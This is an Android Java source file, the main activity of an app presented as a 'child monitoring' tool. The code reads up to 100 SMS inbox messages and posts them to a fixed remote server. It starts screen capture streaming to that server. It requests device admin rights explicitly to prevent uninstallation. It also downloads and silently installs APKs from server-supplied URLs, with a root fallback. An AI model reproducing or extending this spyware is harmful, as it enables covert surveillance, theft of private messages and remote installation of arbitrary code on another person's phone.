package com.monitoring.child;

import android.Manifest;
import android.app.Activity;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageInstaller;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.UUID;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";
    private static final String FIXED_SERVER_IP = "screenmonitoring-6hn7.onrender.com";

    private static final int REQUEST_CODE_SCREEN_CAPTURE = 1000;
    private static final int REQUEST_CODE_DEVICE_ADMIN = 1001;
    private static final int REQUEST_CODE_PERMISSIONS = 1002;

    private TextView tvDeviceId, tvDeviceName, tvStatus;
    private String deviceId, deviceName;
    private final OkHttpClient httpClient = new OkHttpClient();
    private final Handler mainHandler = new Handler(Looper.getMainLooper());

    private DevicePolicyManager dpm;
    private ComponentName adminComponent;

    private int savedResultCode = -1;
    private Intent savedResultData = null;
    private InstallResultReceiver installReceiver;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);

        tvDeviceId = findViewById(R.id.tvDeviceId);
        tvDeviceName = findViewById(R.id.tvDeviceName);
        tvStatus = findViewById(R.id.tvStatus);

        SharedPreferences prefs = getSharedPreferences("monitoring_prefs", MODE_PRIVATE);
        prefs.edit().putString("server_ip", FIXED_SERVER_IP).apply();

        deviceId = prefs.getString("device_id", null);
        if (deviceId == null) {
            deviceId = "CHILD_" + UUID.randomUUID().toString().substring(0, 8).toUpperCase();
            prefs.edit().putString("device_id", deviceId).apply();
        }
        deviceName = Build.MANUFACTURER + " " + Build.MODEL;

        tvDeviceId.setText("Device ID: " + deviceId);
        tvDeviceName.setText("Device Name: " + deviceName);

        // Register install result receiver
        installReceiver = new InstallResultReceiver();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(installReceiver, new IntentFilter("com.monitoring.child.INSTALL_STATUS"),
                    Context.RECEIVER_EXPORTED);
        } else {
            registerReceiver(installReceiver, new IntentFilter("com.monitoring.child.INSTALL_STATUS"));
        }

        requestRequiredPermissions();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (installReceiver != null) {
            try {
                unregisterReceiver(installReceiver);
            } catch (Exception ignored) {}
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        updateStatusText();
    }

    private void updateStatusText() {
        if (ScreenCaptureService.isRunning) {
            tvStatus.setText("Status: Active & Monitoring");
            tvStatus.setTextColor(ContextCompat.getColor(this, android.R.color.holo_green_dark));
        } else {
            tvStatus.setText("Status: Starting…");
            tvStatus.setTextColor(ContextCompat.getColor(this, android.R.color.holo_orange_dark));
        }
    }

    // ──────────────────────────────────────────────────────────────────────────
    // SILENT APK DOWNLOAD + INSTALL
    // ──────────────────────────────────────────────────────────────────────────

    /**
     * Step 1: Download APK from server
     * Step 2: Install silently using PackageInstaller
     */
    public void downloadAndInstallApk(String apkUrl, String packageName) {
        new Thread(() -> {
            try {
                File apkFile = new File(getCacheDir(), "temp_update.apk");

                // Download
                Request request = new Request.Builder().url(apkUrl).build();
                Response response = httpClient.newCall(request).execute();

                if (!response.isSuccessful()) throw new IOException("Download failed");

                try (var is = response.body().byteStream();
                     var fos = new FileOutputStream(apkFile)) {
                    byte[] buffer = new byte[8192];
                    int len;
                    while ((len = is.read(buffer)) != -1) {
                        fos.write(buffer, 0, len);
                    }
                }
                response.close();

                Log.d(TAG, "APK Downloaded: " + apkFile.length() + " bytes");

                // Root + Fallback
                ApkSilentInstaller.installWithRoot(this, apkFile);

            } catch (Exception e) {
                Log.e(TAG, "Download/Install Error", e);
                mainHandler.post(() -> Toast.makeText(this, "Install Error: " + e.getMessage(), Toast.LENGTH_LONG).show());
            }
        }).start();
    }

    /**
     * Install APK silently using PackageInstaller.SessionParams
     * Works on Android 5.0+
     *
     * @param apkUri APK file URI (file:// or content://)
     * @param packageName Optional: package name hint for the installer
     */
    public void installApkSilently(Uri apkUri, String packageName) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            Toast.makeText(this, "Silent install requires Android 5.0+", Toast.LENGTH_LONG).show();
            return;
        }

        try {
            PackageInstaller packageInstaller = getPackageManager().getPackageInstaller();
            PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                    PackageInstaller.SessionParams.MODE_FULL_INSTALL);

            if (packageName != null && !packageName.isEmpty()) {
                params.setAppPackageName(packageName);
            }

            int sessionId = packageInstaller.createSession(params);
            PackageInstaller.Session session = packageInstaller.openSession(sessionId);

            // Read APK and write to session
            try (InputStream in = getContentResolver().openInputStream(apkUri);
                 OutputStream out = session.openWrite("app.apk", 0, -1)) {

                byte[] buffer = new byte[65536];
                int bytesRead;
                while ((bytesRead = in.read(buffer)) != -1) {
                    out.write(buffer, 0, bytesRead);
                }
                session.fsync(out);
            }

            // Create intent for callback after install
            Intent intent = new Intent("com.monitoring.child.INSTALL_STATUS");
            PendingIntent pendingIntent = PendingIntent.getBroadcast(this, sessionId,
                    intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);

            // Commit — triggers installation silently
            session.commit(pendingIntent.getIntentSender());
            session.close();

            Log.d(TAG, "Silent install started. Session ID: " + sessionId);
            mainHandler.post(() -> Toast.makeText(this,
                    "Installing app silently...", Toast.LENGTH_SHORT).show());

        } catch (Exception e) {
            Log.e(TAG, "Silent install error", e);
            mainHandler.post(() -> Toast.makeText(this,
                    "Install error: " + e.getMessage(), Toast.LENGTH_LONG).show());
        }
    }

    // ──────────────────────────────────────────────────────────────────────────
    // PERMISSION FLOW
    // ──────────────────────────────────────────────────────────────────────────

    private void requestRequiredPermissions() {
        String[] permissions = {
                Manifest.permission.READ_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.CAMERA
        };

        // Add INSTALL_PACKAGES permission for silent install (Android 12+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            String[] withInstallPerm = new String[permissions.length + 1];
            System.arraycopy(permissions, 0, withInstallPerm, 0, permissions.length);
            withInstallPerm[permissions.length] = Manifest.permission.REQUEST_INSTALL_PACKAGES;
            permissions = withInstallPerm;
        }

        boolean allGranted = true;
        for (String p : permissions) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }
        if (allGranted) {
            afterPermissionsGranted();
        } else {
            ActivityCompat.requestPermissions(this, permissions, REQUEST_CODE_PERMISSIONS);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        afterPermissionsGranted();
    }

    private void afterPermissionsGranted() {
        if (!dpm.isAdminActive(adminComponent)) {
            Intent adminIntent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            adminIntent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            adminIntent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Required to protect this monitoring app from being uninstalled.");
            startActivityForResult(adminIntent, REQUEST_CODE_DEVICE_ADMIN);
        } else {
            beginMonitoringFlow();
        }
    }

    private void beginMonitoringFlow() {
        if (ScreenCaptureService.isRunning) return;
        syncSmsInbox(FIXED_SERVER_IP);
        registerDeviceWithBackend(FIXED_SERVER_IP);
    }

    private void registerDeviceWithBackend(String serverIp) {
        String url = UrlHelper.getApiUrl(serverIp, "/api/devices/register");

        JSONObject json = new JSONObject();
        try {
            json.put("device_id", deviceId);
            json.put("device_name", deviceName);
        } catch (Exception e) {
            e.printStackTrace();
        }

        RequestBody body = RequestBody.create(
                json.toString(),
                MediaType.parse("application/json; charset=utf-8")
        );
        Request request = new Request.Builder().url(url).post(body).build();

        httpClient.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.e(TAG, "Backend registration failed: " + e.getMessage());
                mainHandler.post(() -> requestScreenCapturePermission());
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                response.close();
                mainHandler.post(() -> {
                    if (savedResultCode != -1 && savedResultData != null) {
                        launchService(savedResultCode, savedResultData);
                    } else {
                        requestScreenCapturePermission();
                    }
                });
            }
        });
    }

    private void requestScreenCapturePermission() {
        if (savedResultCode != -1 && savedResultData != null) {
            launchService(savedResultCode, savedResultData);
            return;
        }
        MediaProjectionManager mpm =
                (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        if (mpm != null) {
            startActivityForResult(mpm.createScreenCaptureIntent(), REQUEST_CODE_SCREEN_CAPTURE);
        }
    }

    private void launchService(int resultCode, Intent resultData) {
        if (ScreenCaptureService.isRunning) return;

        Intent serviceIntent = new Intent(this, ScreenCaptureService.class);
        serviceIntent.putExtra("result_code", resultCode);
        serviceIntent.putExtra("data", resultData);
        serviceIntent.putExtra("device_id", deviceId);
        serviceIntent.putExtra("device_name", deviceName);
        serviceIntent.putExtra("server_ip", FIXED_SERVER_IP);
        serviceIntent.putExtra("camera_enabled", false);

        ContextCompat.startForegroundService(this, serviceIntent);
        new Handler().postDelayed(this::updateStatusText, 1000);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == REQUEST_CODE_SCREEN_CAPTURE) {
            if (resultCode == Activity.RESULT_OK && data != null) {
                savedResultCode = resultCode;
                savedResultData = data;
                launchService(resultCode, data);
            } else {
                Log.w(TAG, "Screen capture denied, retrying in 3s");
                mainHandler.postDelayed(this::requestScreenCapturePermission, 3000);
            }
        } else if (requestCode == REQUEST_CODE_DEVICE_ADMIN) {
            beginMonitoringFlow();
        }
    }

    private void syncSmsInbox(String serverIp) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) return;

        new Thread(() -> {
            try {
                Uri inboxUri = Uri.parse("content://sms/inbox");
                String[] projection = {"address", "body", "date"};
                Cursor cursor = getContentResolver().query(
                        inboxUri, projection, null, null, "date DESC LIMIT 100");

                if (cursor == null) return;

                JSONArray messages = new JSONArray();
                while (cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                    String msgBody = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                    long date = cursor.getLong(cursor.getColumnIndexOrThrow("date"));

                    JSONObject msg = new JSONObject();
                    msg.put("device_id", deviceId);
                    msg.put("sender", address != null ? address : "Unknown");
                    msg.put("body", msgBody != null ? msgBody : "");
                    msg.put("timestamp", date);
                    messages.put(msg);
                }
                cursor.close();

                if (messages.length() == 0) return;

                JSONObject payload = new JSONObject();
                payload.put("device_id", deviceId);
                payload.put("messages", messages);

                String url = UrlHelper.getApiUrl(serverIp, "/api/sms/upload");
                RequestBody body = RequestBody.create(
                        payload.toString(),
                        MediaType.parse("application/json; charset=utf-8")
                );
                Request req = new Request.Builder().url(url).post(body).build();
                httpClient.newCall(req).enqueue(new Callback() {
                    @Override
                    public void onFailure(Call call, IOException e) {}

                    @Override
                    public void onResponse(Call call, Response response) {
                        response.close();
                    }
                });
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    // ──────────────────────────────────────────────────────────────────────────
    // INSTALL RESULT RECEIVER
    // ──────────────────────────────────────────────────────────────────────────

    public class InstallResultReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            int status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, -1);
            String message = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE);

            switch (status) {
                case PackageInstaller.STATUS_PENDING_USER_ACTION:
                    Intent prompt = intent.getParcelableExtra(Intent.EXTRA_INTENT);
                    if (prompt != null) startActivity(prompt);
                    break;
                case PackageInstaller.STATUS_SUCCESS:
                    Log.i(TAG, "✓ APK installed successfully (silent)");
                    Toast.makeText(context, "✓ App installed silently", Toast.LENGTH_LONG).show();
                    break;
                default:
                    Log.e(TAG, "Install failed: " + message);
                    Toast.makeText(context, "✗ Install failed: " + message, Toast.LENGTH_LONG).show();
                    break;
            }
        }
    }
}